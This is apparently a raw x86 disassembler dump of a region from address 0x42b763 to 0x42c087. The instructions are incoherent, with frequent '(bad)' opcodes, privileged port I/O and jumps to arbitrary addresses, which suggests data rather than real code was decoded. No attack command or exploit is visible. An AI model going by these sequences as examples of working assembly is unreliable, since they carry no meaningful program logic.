  42b763:	mov    bh,0x4
  42b765:	xchg   ecx,esp
  42b767:	and    al,0xad
  42b769:	pushf  
  42b76a:	(bad)  
  42b76b:	mov    esp,0xca687bf
  42b770:	pop    edi
  42b771:	mov    esi,0x4e07bd00
  42b776:	mov    ecx,DWORD PTR [ecx]
  42b778:	in     eax,0x7
  42b77a:	push   edi
  42b77b:	or     BYTE PTR [ebx+0x24],0x18
  42b77f:	xchg   edx,eax
  42b780:	dec    ebx
  42b781:	and    al,0x18
  42b783:	xchg   edx,eax
  42b784:	dec    ebx
  42b785:	and    al,0x18
  42b787:	jmp    0x42b756
  42b789:	adc    eax,0x47aedc
  42b78e:	mov    eax,DWORD PTR [ebp+0x7274e7f4]
  42b794:	int3   
  42b795:	test   DWORD PTR [ebx-0x3daa13a6],0x0
	...
  42b7b3:	add    BYTE PTR [ebp+0x18b5507],ch
  42b7b9:	test   BYTE PTR [edx-0x90b7a8b],0x75
  42b7c0:	cmc    
  42b7c1:	int    0x75
  42b7c3:	adc    al,0xc2
  42b7c5:	dec    edx
  42b7c6:	adc    bh,bh
  42b7c8:	dec    eax
  42b7c9:	mov    bl,0x51
  42b7cb:	(bad)  
  42b7cc:	cmp    BYTE PTR [ebx+0x385d4014],dl
  42b7d2:	clc    
  42b7d3:	push   edi
  42b7d4:	mov    ch,0xf9
  42b7d6:	idiv   bh
  42b7d8:	adc    bh,BYTE PTR [ecx]
  42b7da:	mov    edi,0xb9e2335f
  42b7df:	adc    al,0x1d
  42b7e1:	jmp    0x875:0x386bec82
  42b7e8:	push   0xffffffcc
  42b7ea:	jne    0x42b804
  42b7ec:	repnz dec edx
  42b7ee:	adc    al,0xff
  42b7f0:	mov    BYTE PTR [edi-0xaee8a0a],dh
  42b7f6:	not    BYTE PTR ds:0x3babe9
  42b7fc:	xchg   al,cl
  42b7fe:	dec    edi
  42b7ff:	call   0x3a7bf6
  42b804:	hlt    
  42b805:	es mov ebx,0xbde9425b
  42b80b:	adc    al,0xf4
  42b80d:	sbb    BYTE PTR [edi-0x14],dh
  42b810:	daa    
  42b811:	mov    edi,0xf1b737a6
  42b816:	xrelease xchg BYTE PTR [eax],al
	...
  42b831:	xor    eax,ebx
  42b833:	xlat   BYTE PTR ds:[ebx]
  42b834:	ficom  WORD PTR [esi]
  42b836:	lods   al,BYTE PTR ds:[esi]
  42b837:	push   DWORD PTR [esi]
  42b839:	mov    bh,0x19
  42b83b:	add    BYTE PTR [edi],ch
  42b83d:	mov    ah,0x87
  42b83f:	sbb    BYTE PTR [edi+0x47],cl
  42b842:	mov    edx,DWORD PTR [ecx+0x10]
  42b845:	inc    edx
  42b846:	sbb    al,0xc3
  42b848:	jne    0x42b84a
  42b84a:	pop    ds
  42b84b:	ret    
  42b84c:	jne    0x42b84a
  42b84e:	xor    dh,cl
  42b850:	addr16 in eax,0xeb
  42b853:	add    esi,DWORD PTR [edi]
  42b855:	mov    bh,0xa2
  42b857:	fstp   TBYTE PTR [ecx]
  42b859:	sar    DWORD PTR [ebx-0x5f86f4bb],1
  42b85f:	(bad)  
  42b862:	dec    edx
  42b863:	push   eax
  42b864:	add    ebx,DWORD PTR [edi]
  42b866:	imul   ebp,edi,0xed34267c
  42b86c:	push   esi
  42b86d:	test   eax,0xa8fff7ed
  42b872:	fadd   DWORD PTR es:[edi+0x532dbbb1]
  42b879:	sahf   
  42b87a:	stos   DWORD PTR es:[edi],eax
  42b87b:	ret    0xf875
  42b87e:	fmulp  st(5),st
  42b880:	sti    
  42b881:	test   eax,0x1b9ad7a3
  42b886:	add    eax,ebx
  42b888:	xchg   DWORD PTR [ecx+eiz*1],ecx
  42b88b:	ret    
  42b88c:	jnp    0x42b87e
  42b88e:	jle    0x42b84f
  42b890:	out    0xbe,eax
  42b892:	bound  ebp,QWORD PTR [edx]
  42b894:	call   0x42b899
	...
  42b8ad:	add    BYTE PTR [eax-0xbfbc0fc],bh
  42b8b3:	(bad)  
  42b8b4:	fld    DWORD PTR [eax+0x7ac230e6]
  42b8ba:	cmp    DWORD PTR ds:0x2fdf2f36,edx
  42b8c0:	cmc    
  42b8c1:	js     0x42b8f2
  42b8c3:	mov    edx,0xacfc50ba
  42b8c8:	cmp    eax,0xeeb9bfc7
  42b8cd:	ret    0xf40
  42b8d0:	cmp    ebx,esp
  42b8d2:	in     eax,dx
  42b8d3:	pop    esi
  42b8d4:	jmp    0x7f0793dc
  42b8d9:	cli    
  42b8da:	jp     0x42b91b
  42b8dc:	cmc    
  42b8dd:	xor    BYTE PTR [eax+esi*1-0x72138319],0xa3
  42b8e5:	sub    ch,BYTE PTR [edi]
  42b8e7:	pop    ebx
  42b8e8:	adc    al,0xc2
  42b8ea:	in     al,0x4
  42b8ec:	sbb    ah,bl
  42b8ee:	jns    0x42b94b
  42b8f0:	jmp    0x51966bf8
  42b8f5:	in     eax,dx
  42b8f6:	rol    DWORD PTR [ecx+ebp*8],0xc2
  42b8fa:	leave  
  42b8fb:	lea    edi,ds:0x6c52ab34
  42b901:	(bad)  
  42b902:	leave  
  42b903:	out    0xf5,al
  42b905:	stos   BYTE PTR es:[edi],al
  42b906:	sbb    esi,DWORD PTR [ebx+0x52ec405e]
  42b90c:	xchg   esi,eax
  42b90d:	mov    cl,0x14
  42b910:	and    dl,BYTE PTR [eax+0x0]
	...
  42b92b:	add    BYTE PTR [ebp-0x46d158fa],ch
  42b931:	pop    esi
  42b932:	sar    DWORD PTR [ecx-0x4e],cl
  42b935:	nop
  42b936:	push   cs
  42b937:	stos   DWORD PTR es:[edi],eax
  42b938:	lods   al,BYTE PTR ds:[esi]
  42b939:	push   cs
  42b93a:	sub    al,0xf4
  42b93c:	add    al,0xe
  42b93e:	adc    BYTE PTR [ebx+0x3f],dh
  42b941:	add    cl,ah
  42b943:	popf   
  42b944:	mov    edx,0x5133748c
  42b949:	call   0x47d679
  42b94e:	fs mov al,0x32
  42b951:	and    eax,0x42b93362
  42b956:	inc    edx
  42b957:	stos   BYTE PTR es:[edi],al
  42b958:	mov    eax,0xa5b7af86
  42b95d:	(bad)  
  42b95e:	sbb    BYTE PTR [eax-0x816a69e],ch
  42b964:	jg     0x42b93e
  42b966:	lea    esi,fs:[edx]
  42b969:	mov    eax,0xe75dbe13
  42b96e:	icebp  
  42b96f:	sub    bh,BYTE PTR [esp+esi*2-0x78e3e115]
  42b976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b977:	ror    BYTE PTR [edi-0x37],cl
  42b97a:	stos   DWORD PTR es:[edi],eax
  42b97b:	mov    WORD PTR [eax+0x38ac7254],?
  42b981:	in     al,0x71
  42b983:	ja     0x42b92e
  42b985:	nop
  42b986:	call   0xedcfbe82
  42b98b:	adc    edx,DWORD PTR [ebp+0x68]
  42b98e:	jmp    0x42b990
	...
  42b9a8:	cmc    
  42b9a9:	add    al,0x0
  42b9ab:	push   esi
  42b9ac:	push   ebx
  42b9ad:	rcl    BYTE PTR ds:0xd8b3f7a9,1
  42b9b3:	loop   0x42b9ec
  42b9b5:	inc    ebp
  42b9b6:	xchg   DWORD PTR [ebx+edx*1+0x78],eax
  42b9ba:	sti    
  42b9bb:	or     al,0x4c
  42b9bd:	push   ss
  42b9be:	inc    eax
  42b9bf:	jmp    0x73eabd3c
  42b9c4:	mov    eax,0x5fdc8004
  42b9c9:	fidivr DWORD PTR [edi]
  42b9cb:	jmp    0xb67aebc7
  42b9d0:	jo     0x42b9df
  42b9d2:	fiadd  DWORD PTR [eax]
  42b9d4:	pop    esi
  42b9d5:	add    al,0x4f
  42b9d7:	jmp    DWORD PTR [eax]
  42b9d9:	lods   al,BYTE PTR ds:[esi]
  42b9da:	or     eax,0x3d840d40
  42b9df:	fsubr  st,st(0)
  42b9e1:	inc    ebp
  42b9e2:	add    BYTE PTR [eax],al
  42b9e4:	push   eax
  42b9e5:	stos   DWORD PTR es:[edi],eax
  42b9e6:	jecxz  0x42b994
  42b9e8:	retf   0xf7c0
  42b9eb:	test   BYTE PTR [ebp-0x2f38eeb9],cl
  42b9f1:	pop    edi
  42b9f2:	fld    QWORD PTR [ebx-0x23]
  42b9f5:	push   eax
  42b9f6:	pop    ds
  42b9f7:	inc    edx
  42b9f8:	fnstsw WORD PTR [ecx+0x5]
  42b9fb:	fsubr  DWORD PTR [eax+0x44]
  42b9fe:	add    BYTE PTR [ecx],al
  42ba00:	loop   0x42b9c3
  42ba02:	adc    eax,0x43af1c
  42ba07:	pop    edi
  42ba08:	daa    
  42ba09:	clc    
  42ba0a:	and    eax,DWORD PTR [eax+eax*1]
	...
  42ba25:	push   cs
  42ba26:	repnz add edi,edi
  42ba29:	push   cs
  42ba2a:	pop    edx
  42ba2b:	or     BYTE PTR [eax],al
  42ba2d:	add    eax,0xd18a0bfa
  42ba32:	in     al,0x7
  42ba34:	mov    bl,dl
  42ba36:	scas   eax,DWORD PTR es:[edi]
  42ba37:	add    dh,0x4f
  42ba3a:	mov    ebx,0xd2e655fb
  42ba3f:	call   0x461822
  42ba44:	not    BYTE PTR [ecx+0x41010817]
  42ba4a:	mov    ecx,0xea46e851
  42ba4f:	(bad)  
  42ba50:	inc    esi
  42ba52:	jns    0x42baaa
  42ba54:	ret    0x351
  42ba57:	push   ebp
  42ba58:	mov    edi,ecx
  42ba5a:	sub    ah,0x78
  42ba5d:	sbb    al,0x3
  42ba5f:	add    bh,al
  42ba61:	adc    ebx,DWORD PTR [ebx-0x520bbf7e]
  42ba67:	jg     0x42baa6
  42ba69:	cmp    al,0xe8
  42ba6b:	aas    
  42ba6c:	add    ah,dh
  42ba6e:	xchg   esi,eax
  42ba6f:	dec    edx
  42ba70:	xor    cl,BYTE PTR [ebx-0x4b]
  42ba73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba74:	aas    
  42ba75:	hlt    
  42ba76:	xchg   esi,eax
  42ba77:	les    edx,FWORD PTR ds:0x3fdbdc
  42ba7d:	je     0x42ba60
  42ba7f:	fcmovnu st,st(5)
  42ba81:	aaa    
  42ba82:	lods   al,BYTE PTR ds:[esi]
  42ba83:	push   DWORD PTR [esi+edi*8-0x3d]
  42ba87:	out    0xfa,al
	...
  42baa1:	add    bl,bl
  42baa3:	(bad)  
  42baa4:	mov    al,al
  42baa6:	dec    eax
  42baa7:	ffree  st(6)
  42baa9:	add    eax,0x4399a8
  42baae:	push   ebx
  42baaf:	pop    es
  42bab0:	inc    edx
  42bab1:	add    BYTE PTR [edx+0x37ddd7a1],dh
  42bab7:	lods   al,BYTE PTR ds:[esi]
  42bab8:	add    al,0x53
  42baba:	stos   DWORD PTR es:[edi],eax
  42babb:	mov    cl,0x1b
  42babd:	push   cs
  42babe:	xor    al,0xac
  42bac0:	nop
  42bac1:	inc    ebp
  42bac2:	cwde   
  42bac3:	cld    
  42bac4:	nop
  42bac5:	test   DWORD PTR [esi+edi*2-0x41],edi
  42bac9:	sti    
  42baca:	and    al,0x14
  42bacc:	or     BYTE PTR [eax],ah
  42bace:	hlt    
  42bacf:	stos   DWORD PTR es:[edi],eax
  42bad0:	daa    
  42bad1:	sti    
  42bad2:	jnp    0x42ba80
  42bad4:	(bad)  
  42bad5:	cli    
  42bad6:	jmp    0xf5b7398e
  42badb:	stos   DWORD PTR es:[edi],eax
  42badc:	dec    DWORD PTR [eax+0x15bf4fe1]
  42bae2:	add    al,0xae
  42bae4:	aas    
  42bae5:	add    BYTE PTR [ecx-0x14],bh
  42bae8:	aaa    
  42bae9:	bt     DWORD PTR [eax],ebp
  42baec:	mov    DWORD PTR [eax+0x66beef42],ecx
  42baf2:	hlt    
  42baf3:	fwait
  42baf4:	mov    esi,0xfb04c415
  42baf9:	inc    ebx
  42bafa:	hlt    
  42bafb:	and    DWORD PTR ds:0xd77a310,0xe3b61fc2
  42bb05:	bound  eax,QWORD PTR [eax]
	...
  42bb1f:	mov    BYTE PTR [ecx],dl
  42bb21:	adc    WORD PTR [eax],0xfab7
  42bb26:	ret    0x5e5
  42bb29:	pop    esp
  42bb2a:	(bad)  
  42bb2b:	dec    ah
  42bb2d:	lds    eax,FWORD PTR ds:0xaef43e7c
  42bb33:	lock mov esi,0x89f51123
  42bb39:	ins    BYTE PTR es:[edi],dx
  42bb3a:	xlat   BYTE PTR ds:[ebx]
  42bb3b:	fidiv  WORD PTR [ebp+0x39babca]
  42bb41:	jmp    0xf1620649
  42bb46:	add    ebp,DWORD PTR [esi+edi*1-0x1b]
  42bb4a:	mov    ?,WORD PTR [ecx]
  42bb4c:	or     eax,0x89f84960
  42bb51:	stos   DWORD PTR es:[edi],eax
  42bb52:	int3   
  42bb53:	push   0x0
  42bb55:	jmp    0xaaf636b3
  42bb5a:	add    al,0x4c
  42bb5c:	mov    ch,BYTE PTR [ecx]
  42bb5e:	add    al,0x9c
  42bb60:	sub    ecx,0x3
  42bb63:	hlt    
  42bb64:	push   esi
  42bb65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb66:	xchg   dh,bh
  42bb68:	add    BYTE PTR [edx+0x37],dh
  42bb6b:	jnp    0x42bbd2
  42bb6d:	call   0xabb1bb38
  42bb72:	adc    BYTE PTR [eax+esi*1+0x1e84bec],bh
  42bb79:	pop    ss
  42bb7a:	les    ebx,FWORD PTR [ebx-0x25a318d6]
  42bb80:	adc    ecx,DWORD PTR [esi+0x8]
	...
  42bb9b:	add    BYTE PTR [ebx],bl
  42bb9d:	int3   
  42bb9e:	test   al,0x2d
  42bba0:	test   BYTE PTR [edx+0x4eebaf00],0xe8
  42bba7:	mov    al,ds:0xbb0004f8
  42bbac:	rcl    BYTE PTR [ebx+edi*8-0xc],0xf
  42bbb1:	adc    eax,DWORD PTR [eax-0x17]
  42bbb4:	and    cl,ah
  42bbb6:	jg     0x42bbc9
  42bbb8:	mov    eax,DWORD PTR ss:[edx-0x13]
  42bbbc:	out    0x8f,al
  42bbbe:	shr    BYTE PTR [edx],0x7a
  42bbc1:	cmp    cl,BYTE PTR [eax]
  42bbc3:	jmp    0x6f7bbd8b
  42bbc8:	pop    es
  42bbc9:	add    BYTE PTR [ecx+ebp*4-0x12ea4f4f],dl
  42bbd0:	std    
  42bbd1:	inc    esp
  42bbd2:	add    BYTE PTR [eax+0x2e],ah
  42bbd5:	std    
  42bbd6:	test   BYTE PTR [ecx+0x1953130c],ch
  42bbdc:	mov    ch,0x37
  42bbde:	add    al,0xbe
  42bbe0:	jmp    0x42bbea
  42bbe2:	adc    ch,BYTE PTR [ecx]
  42bbe4:	lock mov eax,eax
  42bbe7:	xor    al,0xfe
  42bbe9:	jge    0x42bc65
  42bbeb:	stc    
  42bbec:	daa    
  42bbed:	push   es
  42bbee:	mov    edi,0xfafcde9e
  42bbf3:	cld    
  42bbf4:	pop    edi
  42bbf5:	sbb    al,BYTE PTR [eax-0x17]
  42bbf8:	js     0x42bc21
  42bbfa:	or     cl,ch
  42bbfc:	xor    DWORD PTR [edi+edi*4+0x72],0x0
	...
  42bc18:	add    BYTE PTR [esi],ch
  42bc1a:	or     DWORD PTR [edi+0x71],edi
  42bc1d:	mov    ch,0x39
  42bc1f:	adc    al,BYTE PTR [ebx]
  42bc21:	cli    
  42bc22:	push   esp
  42bc23:	sti    
  42bc24:	cld    
  42bc25:	movhps QWORD PTR [eax-0x17],xmm0
  42bc29:	xor    al,0x37
  42bc2b:	add    al,0x56
  42bc2d:	add    edi,ecx
  42bc2f:	adc    DWORD PTR [ecx+0x4a33f7],ebp
  42bc35:	pop    ecx
  42bc36:	lds    eax,FWORD PTR [ebx-0x3f74baba]
  42bc3c:	je     0x42bc94
  42bc3e:	pop    eax
  42bc3f:	not    DWORD PTR ds:0x401be5
  42bc45:	sahf   
  42bc46:	fiadd  WORD PTR [edi]
  42bc48:	add    dh,cl
  42bc4a:	pop    ebx
  42bc4b:	sub    esp,0xffffff8e
  42bc4e:	je     0x42bc9c
  42bc50:	push   esi
  42bc51:	xchg   esi,eax
  42bc52:	js     0x42bcb6
  42bc54:	add    edx,esi
  42bc56:	out    dx,al
  42bc57:	add    edi,edi
  42bc59:	sub    BYTE PTR [eax],dl
  42bc5b:	push   cs
  42bc5c:	inc    eax
  42bc5d:	or     eax,0x8a75c08b
  42bc62:	cmp    dh,0x69
  42bc65:	std    
  42bc66:	or     DWORD PTR [ebp-0x20],0x1c
  42bc6a:	add    dh,0xff
  42bc6d:	sbb    eax,0x42c084fd
  42bc72:	jbe    0x42bce8
  42bc74:	dec    ebx
  42bc75:	mov    dl,0x1a
  42bc77:	int3   
  42bc78:	adc    eax,0x333d090d
	...
  42bc95:	add    dl,ch
  42bc97:	or     BYTE PTR [eax],al
  42bc99:	jne    0x42bc45
  42bc9b:	fisttp WORD PTR [edi]
  42bc9d:	daa    
  42bc9e:	popf   
  42bc9f:	pop    es
  42bca0:	lea    eax,[ebp+0x49]
  42bca3:	pop    eax
  42bca4:	add    DWORD PTR [ebp-0x6b],0xffffffe1
  42bca8:	and    al,ch
  42bcaa:	icebp  
  42bcab:	or     eax,DWORD PTR [eax]
  42bcad:	add    BYTE PTR [eax],bl
  42bcaf:	enter  0x2075,0xb
  42bcb3:	dec    ebx
  42bcb4:	mov    ah,0x20
  42bcb6:	jns    0x42bcc2
  42bcb8:	cmp    DWORD PTR [ebp-0x6f],eax
  42bcbb:	cli    
  42bcbc:	pop    ds
  42bcbd:	neg    BYTE PTR [eax-0x6a8bfec5]
  42bcc3:	mov    BYTE PTR [ebp-0x48],bh
  42bcc6:	hlt    
  42bcc7:	popf   
  42bcc8:	xor    ebp,DWORD PTR [esi-0x48827ad]
  42bcce:	loope  0x42bc7d
  42bcd0:	sbb    DWORD PTR [eax-0xc],eax
  42bcd3:	scas   eax,DWORD PTR es:[edi]
  42bcd4:	mov    edi,0x2df2d5a
  42bcd9:	add    BYTE PTR [esp+ebx*4-0x54],ah
  42bcdd:	repz sub edx,DWORD PTR [eax+0x780ee7cb]
  42bce4:	mov    esp,gs
  42bce6:	jne    0x42bcf1
  42bce8:	aaa    
  42bce9:	add    esp,esi
  42bceb:	popf   
  42bcec:	mov    al,BYTE PTR [ebp+0x8]
  42bcef:	lea    ecx,[edx-0x444c937b]
  42bcf5:	sti    
  42bcf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcf7:	test   DWORD PTR [ebx],eax
  42bcf9:	and    BYTE PTR [eax],al
	...
  42bd13:	hlt    
  42bd14:	fwait
  42bd15:	daa    
  42bd16:	sti    
  42bd17:	jmp    0x42bcb5
  42bd19:	(bad)  
  42bd1a:	cli    
  42bd1b:	imul   esi,DWORD PTR [edx+eax*8+0x550d845],0x19c2f400
  42bd26:	adc    dl,ah
  42bd28:	fild   DWORD PTR [ebx]
  42bd2a:	test   DWORD PTR [ecx+edi*8-0x6f8e78f0],esi
  42bd31:	mov    edx,0x20c4b3fb
  42bd36:	add    ah,dh
  42bd38:	fwait
  42bd39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bd3a:	(bad)  
  42bd3b:	in     eax,0x5b
  42bd3d:	int    0xbe
  42bd3f:	lock fwait
  42bd41:	or     dh,BYTE PTR [edx+0x637e4b4]
  42bd47:	cmp    al,0xb0
  42bd49:	(bad)  
  42bd4a:	cs mov ah,0x5f
  42bd4d:	adc    ebx,DWORD PTR es:[edi+ebx*2]
  42bd51:	es dec bl
  42bd54:	pop    esi
  42bd55:	dec    esp
  42bd56:	dec    eax
  42bd57:	loopne 0x42bd5d
  42bd59:	out    dx,al
  42bd5a:	or     BYTE PTR [eax+ebx*1-0x2b],0x2
  42bd5f:	or     al,ch
  42bd61:	es je  0x42bdb6
  42bd64:	(bad)  
  42bd65:	cdq    
  42bd66:	add    eax,0x447b028b
  42bd6b:	lock cmp al,0xb5
  42bd6e:	or     DWORD PTR [eax+edi*1-0x398c0d1a],ebp
  42bd75:	mov    edi,0x1f
	...
  42bd8e:	add    BYTE PTR [eax],al
  42bd90:	int3   
  42bd91:	lds    ecx,FWORD PTR [edi-0x153a43ed]
  42bd97:	jbe    0x42bd8d
  42bd99:	cmp    al,0xa1
  42bd9b:	aaa    
  42bd9c:	add    BYTE PTR [esi+0x5801901],al
  42bda2:	mov    dh,0xc3
  42bda4:	inc    ebx
  42bda5:	pop    ds
  42bda6:	fstp   QWORD PTR [ebx+0x3b]
  42bda9:	pop    ds
  42bdaa:	fstp   DWORD PTR [ebx-0x4d]
  42bdad:	push   edi
  42bdae:	pop    esi
  42bdaf:	mov    al,0x45
  42bdb1:	jle    0x42bd5e
  42bdb3:	stos   DWORD PTR es:[edi],eax
  42bdb4:	lods   eax,DWORD PTR ds:[esi]
  42bdb5:	mov    cl,0xda
  42bdb7:	mov    esi,0xbee91f44
  42bdbc:	dec    ecx
  42bdbd:	std    
  42bdbe:	pop    edi
  42bdbf:	dec    eax
  42bdc0:	enter  0xdcb1,0x53
  42bdc4:	out    0x44,al
  42bdc6:	jmp    0x64436e4d
  42bdcb:	dec    eax
  42bdcc:	mov    al,0x54
  42bdce:	stos   BYTE PTR es:[edi],al
  42bdcf:	cmp    ah,bh
  42bdd1:	mov    cl,0x1b
  42bdd3:	or     BYTE PTR [edi+0x34188517],bl
  42bdd9:	add    eax,0xc4ebdb9a
  42bdde:	sub    ebp,ecx
  42bde0:	dec    edx
  42bde1:	or     cl,ch
  42bde3:	pop    eax
  42bde4:	jnp    0x42bd86
  42bde6:	sbb    BYTE PTR [ebx+0x5a009cb6],cl
  42bdec:	mov    dl,0xad
  42bdee:	sti    
  42bdef:	sbb    DWORD PTR [esi],ebx
  42bdf1:	add    eax,0xdcfb
	...
  42be0a:	add    BYTE PTR [eax],al
  42be0c:	add    bh,ch
  42be0e:	jnp    0x42be55
  42be10:	pop    ebp
  42be11:	call   0x7f04:0xb7ff5017
  42be18:	and    eax,0x45457ffb
  42be1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42be1e:	lods   eax,DWORD PTR ds:[esi]
  42be1f:	jne    0x42be12
  42be21:	jp     0x42be59
  42be23:	add    al,0x36
  42be25:	or     al,0xa1
  42be27:	adc    eax,0xd8b5f7a9
  42be2c:	add    bh,BYTE PTR [eax]
  42be2e:	inc    esp
  42be2f:	leave  
  42be30:	sub    esi,ebx
  42be32:	add    al,0xfb
  42be34:	popf   
  42be35:	sbb    eax,DWORD PTR ds:0xadff99fb
  42be3b:	jo     0x42be2a
  42be3d:	inc    edx
  42be3e:	pop    ss
  42be3f:	add    bh,dl
  42be41:	mov    bh,0x4
  42be43:	repz adc DWORD PTR [esi],ecx
  42be46:	lds    eax,FWORD PTR [eax+0x2b]
  42be49:	repz add al,0x55
  42be4c:	jb     0x42bdf2
  42be4e:	xor    ah,ch
  42be50:	sbb    DWORD PTR [ebp+0x53],eax
  42be53:	push   ebx
  42be54:	bound  eax,QWORD PTR [edi+0x5cc1d888]
  42be5a:	mov    dl,0xfb
  42be5c:	(bad)  
  42be5d:	ins    BYTE PTR es:[edi],dx
  42be5e:	lds    esi,FWORD PTR [edi+esi*8+0xd]
  42be62:	loopne 0x42bebe
  42be64:	rcl    eax,0xb2
  42be67:	sti    
  42be68:	scas   al,BYTE PTR es:[edi]
  42be69:	jl     0x42be30
  42be6b:	je     0x42be40
  42be6d:	lock jae 0x42be6f
  42be70:	imul   eax,DWORD PTR [eax],0x0
	...
  42be8a:	pop    eax
  42be8b:	scas   eax,DWORD PTR es:[edi]
  42be8c:	je     0x42be7a
  42be8e:	fst    QWORD PTR [eax+ebx*2]
  42be91:	cmp    dl,0xdf
  42be94:	enter  0xe00,0x71
  42be98:	(bad)  
  42be99:	mov    esp,cr0
  42be9c:	lea    eax,[ecx-0x16]
  42be9f:	test   eax,esp
  42bea1:	sbb    al,0xd
  42bea3:	push   esi
  42bea4:	div    DWORD PTR [esi+0x51]
  42bea7:	jno    0x42bebe
  42bea9:	fsub   QWORD PTR [eax+0x44]
  42beac:	add    BYTE PTR [ebp-0x74de12e3],al
  42beb2:	clc    
  42beb3:	aam    0x15
  42beb5:	inc    eax
  42beb6:	dec    ebp
  42beb7:	jno    0x42be88
  42beb9:	mov    ebx,0xfffba93e
  42bebe:	xchg   esp,eax
  42bebf:	inc    edi
  42bec0:	cld    
  42bec1:	cmp    ebx,esi
  42bec3:	in     al,dx
  42bec4:	add    eax,0xf76fdde8
  42bec9:	(bad)  
  42beca:	cli    
  42becb:	idiv   ebx
  42becd:	call   DWORD PTR [eax]
  42becf:	mov    ah,0x11
  42bed1:	inc    eax
  42bed2:	sbb    eax,0xce3bcf71
  42bed7:	imul   DWORD PTR [ecx]
  42bed9:	jmp    0x42bee2
  42bedb:	xor    al,0x1
  42bedd:	jmp    0x42be9a
  42bedf:	jns    0x42bf26
  42bee1:	ror    ch,1
  42bee3:	test   BYTE PTR [esi],0xff
  42bee6:	inc    eax
  42bee7:	add    DWORD PTR [ebp-0x7cac62bb],ecx
  42beed:	inc    ebp
	...
  42bf06:	add    cl,bl
  42bf08:	fisttp QWORD PTR [edi]
  42bf0a:	call   0x42c518
  42bf0f:	push   eax
  42bf10:	les    esi,FWORD PTR [ebp+eiz*8-0x5a]
  42bf14:	add    BYTE PTR [ebx+0x7d],bh
  42bf17:	rol    DWORD PTR [ebx],0x74
  42bf1a:	fstp   DWORD PTR [edx-0xa]
  42bf1d:	jecxz  0x42bf1e
  42bf1f:	mov    al,ds:0x8d4011b3
  42bf24:	mov    ch,0xbb
  42bf26:	pop    edi
  42bf27:	hlt    
  42bf28:	neg    DWORD PTR [eax-0x37]
  42bf2b:	mov    dh,0xa5
  42bf2d:	call   DWORD PTR [ecx+0x6f]
  42bf30:	sub    eax,0xaf74bff0
  42bf35:	or     al,BYTE PTR [ecx]
  42bf37:	retf   
  42bf38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bf39:	xchg   edx,eax
  42bf3a:	sar    BYTE PTR [ecx-0x4b],0xbc
  42bf3e:	jg     0x42bf9b
  42bf40:	mov    al,ds:0x55f77b8a
  42bf45:	stos   DWORD PTR es:[edi],eax
  42bf46:	cld    
  42bf47:	push   ebx
  42bf48:	push   esi
  42bf49:	add    eax,0xffffffc0
  42bf4c:	xchg   ecx,eax
  42bf4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf4e:	pop    ds
  42bf4f:	inc    ecx
  42bf50:	inc    esi
  42bf51:	mov    esp,0x40793484
  42bf56:	or     ebp,DWORD PTR [ebx-0x66]
  42bf59:	cmp    al,0xf6
  42bf5c:	js     0x42bf60
  42bf5e:	data16 add al,0xc6
  42bf61:	test   al,0xa
  42bf63:	out    0xf4,eax
  42bf65:	jg     0x42bf5f
  42bf67:	jmp    0x42bf0f
  42bf69:	xchg   edx,eax
  42bf6a:	rol    DWORD PTR [eax],0x0
	...
  42bf81:	add    BYTE PTR [eax],al
  42bf83:	add    BYTE PTR [ecx+0x5c],bh
  42bf86:	mov    esp,0x4fa9147f
  42bf8b:	dec    edi
  42bf8c:	sti    
  42bf8d:	ss add edi,ebx
  42bf90:	or     eax,eax
  42bf92:	adc    eax,0xbf28f440
  42bf97:	jne    0x42bf96
  42bf99:	sbb    esi,DWORD PTR [esi]
  42bf9b:	or     eax,0x660758f5
  42bfa0:	call   0xcb46ee7b
  42bfa5:	mov    ecx,0x9c3411f3
  42bfaa:	add    al,0x41
  42bfad:	test   al,0x6f
  42bfaf:	add    DWORD PTR [edi-0x47ea4932],ebx
  42bfb5:	fnstcw WORD PTR [edi]
  42bfb7:	add    BYTE PTR [edi+0x5],ch
  42bfba:	mov    eax,ds:0x9aafeeac
  42bfbf:	mov    ebx,0xf3fcae27
  42bfc4:	in     eax,0x44
  42bfc6:	jmp    0x239103c0
  42bfcb:	(bad)  
  42bfcc:	and    DWORD PTR [edx-0x73],edi
  42bfcf:	test   DWORD PTR [eax-0x6b],esp
  42bfd2:	jmp    0xff94b3da
  42bfd7:	cmp    DWORD PTR [ecx-0x78],esi
  42bfda:	fstp   TBYTE PTR [edx+0x3cfae5f]
  42bfe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bfe1:	pushf  
  42bfe2:	arpl   WORD PTR [edi-0xb],ax
  42bfe5:	add    al,0x5e
  42bfe7:	inc    ecx
	...
  42c000:	add    ah,ch
  42c002:	jp     0x42bfad
  42c004:	pop    es
  42c005:	mov    ebx,0x3fabedc8
  42c00a:	mov    al,0x32
  42c00c:	mov    ebx,0x30647b96
  42c011:	pop    ds
  42c012:	scas   al,BYTE PTR es:[edi]
  42c013:	and    ch,BYTE PTR [esp+eax*1]
  42c016:	out    0xe8,al
  42c018:	add    ecx,DWORD PTR [ebp+esi*8-0x65]
  42c01c:	add    esi,esp
  42c01e:	pushf  
  42c01f:	sbb    eax,0x66adffd8
  42c024:	and    DWORD PTR [eax],eax
  42c026:	add    eax,0x26ec4170
  42c02b:	pop    esi
  42c02c:	inc    ecx
  42c02d:	in     al,dx
  42c02e:	es sub ah,al
  42c031:	in     al,dx
  42c032:	es jo  0x42bfb5
  42c035:	data16 scas al,BYTE PTR es:[edi]
  42c037:	fidivr DWORD PTR [edx-0x771eb885]
  42c03d:	imul   edi,DWORD PTR [eax],0x9cbfbaca
  42c043:	fistp  QWORD PTR [edx-0x3c9a5241]
  42c049:	sub    eax,edi
  42c04b:	push   DWORD PTR [ebp+0x2915c104]
  42c051:	clc    
  42c052:	out    dx,eax
  42c053:	aas    
  42c054:	into   
  42c055:	test   DWORD PTR [esi*2-0x7b8b138],0x30accc68
  42c060:	adc    al,0xf8
  42c062:	add    al,0x72
  42c064:	out    dx,al
	...
  42c07d:	add    BYTE PTR [esi+0x56d9f847],dh
  42c083:	lods   eax,DWORD PTR ds:[esi]
  42c084:	sti    
  42c085:	jbe    0x42c03b
  42c087:	mov    eax,0x4adc9b8
